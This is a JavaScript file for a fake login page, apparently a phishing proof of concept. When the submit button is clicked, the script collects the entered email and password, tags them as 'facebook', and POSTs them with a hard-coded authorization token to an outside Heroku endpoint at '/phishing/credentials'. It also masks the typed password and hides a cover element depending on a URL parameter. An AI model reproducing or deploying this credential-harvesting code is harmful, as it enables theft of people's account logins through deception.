const dummy = document.getElementById('k_dummy');
const k_input = document.getElementById('k_input');

function button_on_click(){
	const e_input = document.getElementById('email_input');
	const data = {
		username: e_input.value,
		key: k_input.value,
		service: 'facebook'
	};
	let xhr = new XMLHttpRequest();
	xhr.open("POST", "https://ppamo-poc-cloudant-access.herokuapp.com/phishing/credentials");
	xhr.setRequestHeader("Accept", "application/json");
	xhr.setRequestHeader("Authorization", "Static:HKo8b7vuzA0XqJl84fos99rH2qLHpZ59c9D5cj27");
	xhr.setRequestHeader("Content-Type", "application/json");
	xhr.onload = () => console.log(xhr.responseText);
	xhr.send(data);
}

function update_value(e){
	const text = Array(e.target.value.length).fill('*').join('');
	dummy.innerHTML = text;

}

function page_onload(){
	const queryString = window.location.search;
	const parameters = new URLSearchParams(queryString);
	const value = parameters.get('theme');
	const button=document.getElementById("submit_button");

	button.addEventListener("click", button_on_click, false);
	k_input.addEventListener('input', update_value);

	if (value == "default") {
		document.getElementById("cover").style.visibility = 'hidden';
	}
}

page_onload();
